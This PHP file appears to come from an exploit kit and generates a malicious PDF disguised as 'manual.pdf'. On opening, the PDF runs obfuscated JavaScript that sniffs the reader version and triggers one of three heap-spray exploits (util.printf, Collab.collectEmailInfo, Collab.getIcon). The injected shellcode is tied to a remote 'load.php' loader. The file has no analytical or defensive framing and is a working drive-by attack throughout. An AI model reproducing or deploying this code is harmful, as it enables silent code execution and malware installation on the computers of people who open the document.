<?php

include("./secure/config.php");
include("./secure/javascript.php");
include("./secure/shellcode.php");




$pdf_script = JavaScript::pdfencrypt("function " . $config['CryptSignature'] . "(){
	function fix_it(yarsp, len){
		while (yarsp.length * 2 < len){
			yarsp += yarsp;
		}
		yarsp = yarsp.substring(0, len/2);
		return yarsp;
	}

	function util_printf(){
		var payload = unescape(\"" . ShellCode::get($config['UrlToFolder'] . "load.php?e=2") . "\");
		var nop = unescape(\"%u0A0A%u0A0A%u0A0A%u0A0A\")
		var heapblock = nop + payload;
		var bigblock = unescape(\"%u0A0A%u0A0A\");
		var headersize = 20;
		var spray = headersize + heapblock.length;
		while (bigblock.length < spray){
			bigblock += bigblock;
		}
		var fillblock = bigblock.substring(0, spray);
		var block = bigblock.substring(0, bigblock.length-spray);
		while (block.length+spray < 0x40000){
			block = block + block + fillblock;
		}
		var mem_array = new Array();
		for (var i = 0; i < 1400; i++){
			mem_array[i] = block + heapblock;
		}
		var num = 12999999999999999999888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888;
		util.printf(\"%45000f\", num);
	}

	function collab_email(){
		var shellcode = unescape(\"" . ShellCode::get($config['UrlToFolder'] . "load.php?e=2") . "\");
		var mem_array = new Array();
		var cc = 0x0c0c0c0c;
		var addr = 0x400000;
		var sc_len = shellcode.length * 2;
		var len = addr - (sc_len+0x38);
		var yarsp = unescape(\"%u9090%u9090\");
		yarsp = fix_it(yarsp, len);
		var count2 = (cc - 0x400000)/addr;
		for (var count = 0; count < count2; count++){
			mem_array[count] = yarsp + shellcode;
		}
		var overflow = unescape(\"%u0c0c%u0c0c\");
		while (overflow.length < 44952){
			overflow += overflow;
		}
		this.collabStore = Collab.collectEmailInfo({subj: \"\",msg: overflow});
	}

	function collab_geticon(){
		if (app.doc.Collab.getIcon){
			var arry = new Array();
			var vvpethya = unescape(\"" . ShellCode::get($config['UrlToFolder'] . "load.php?e=2") . "\");
			var hWq500CN = vvpethya.length * 2;
			var len = 0x400000 - (hWq500CN + 0x38);
			var yarsp = unescape(\"%u9090%u9090\");
			yarsp = fix_it(yarsp, len);
			var p5AjK65f = (0x0c0c0c0c - 0x400000) / 0x400000;
			for (var vqcQD96y = 0; vqcQD96y < p5AjK65f; vqcQD96y ++ ){
				arry[vqcQD96y] = yarsp + vvpethya;
			}
			var tUMhNbGw = unescape(\"%09\");
			while (tUMhNbGw.length < 0x4000){
				tUMhNbGw += tUMhNbGw;
			}
			tUMhNbGw = \"N.\" + tUMhNbGw;
			app.doc.Collab.getIcon(tUMhNbGw);
		}
	}

	function pdf_start(){
		var version = app.viewerVersion.toString();
		version = version.replace(/\D/g,'');
		var varsion_array = new Array(version.charAt(0), version.charAt(1), version.charAt(2));
		if ((varsion_array[0] == 8) && (varsion_array[1] == 0) || (varsion_array[1] == 1 && varsion_array[2] < 3)){
			util_printf();
		}
		if ((varsion_array[0] < 8) || (varsion_array[0] == 8 && varsion_array[1] < 2 && varsion_array[2] < 2)){
			collab_email();
		}
		if ((varsion_array[0] < 9) || (varsion_array[0] == 9 && varsion_array[1] < 1)){
			collab_geticon();
		}
	}

	pdf_start();
}");


$pdf_template = "%PDF-1.3
%âãÏÓ
1 0 obj
<</OpenAction <</JS (this." . $config['CryptSignature'] . "\(\))
/S /JavaScript
>>
/Threads 2 0 R
/Outlines 3 0 R
/Pages 4 0 R
/ViewerPreferences <</PageDirection /L2R
>>
/PageLayout /SinglePage
/AcroForm 5 0 R
/Dests 6 0 R
/Names 7 0 R
/Type /Catalog
>>
endobj
2 0 obj
[]
endobj
3 0 obj
<</Count 0
/Type /Outlines
>>
endobj
4 0 obj
<</Resources 8 0 R
/Kids [9 0 R]
/Count 1
/Type /Pages
>>
endobj
5 0 obj
<</Fields []
>>
endobj
6 0 obj
<<>>
endobj
7 0 obj
<</JavaScript 10 0 R
>>
endobj
8 0 obj
<</ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
>>
endobj
9 0 obj
<</Rotate 0
/Parent 4 0 R
/Resources 8 0 R
/TrimBox [0 0 595.28000 841.89000]
/MediaBox [0 0 595.28000 841.89000]
/pdftk_PageNum 1
/Contents 11 0 R
/Type /Page
>>
endobj
10 0 obj
<</Names [(New_Script) 12 0 R]
>>
endobj
11 0 obj
<</Length 31
>>
stream
0 0 595.28000 841.89000 re W n

endstream
endobj
12 0 obj
<</JS 13 0 R
/S /JavaScript
>>
endobj
13 0 obj
<</Length " . strlen($pdf_script) . "
>>
stream
" . $pdf_script . "
endstream
endobj
14 0 obj
<</Creator (Scribus 1.3.3.12)
/Title <>
/Producer (Scribus PDF Library 1.3.3.12)
/Author <>
/Keywords <>
/Trapped /False
/ModDate (2008312053854)
/CreationDate (2008312053854)
>>
endobj
xref
0 15
0000000000 65535 f 
0000000015 00000 n 
0000000261 00000 n 
0000000279 00000 n 
0000000324 00000 n 
0000000397 00000 n 
0000000428 00000 n 
0000000448 00000 n 
0000000487 00000 n 
0000000553 00000 n 
0000000731 00000 n 
0000000781 00000 n 
0000000862 00000 n 
0000000909 00000 n 
0000004186 00000 n 
trailer
<</Info 14 0 R
/Root 1 0 R
/Size 15
>>
startxref
4374
%%EOF
";


header("Accept-Ranges: bytes\r\n");
header("Content-Length: " . strlen($pdf_template) . "\r\n");
header("Content-Disposition: inline; filename=manual.pdf");
header("\r\n");
header("Content-Type: application/pdf\r\n\r\n");
echo $pdf_template;


?>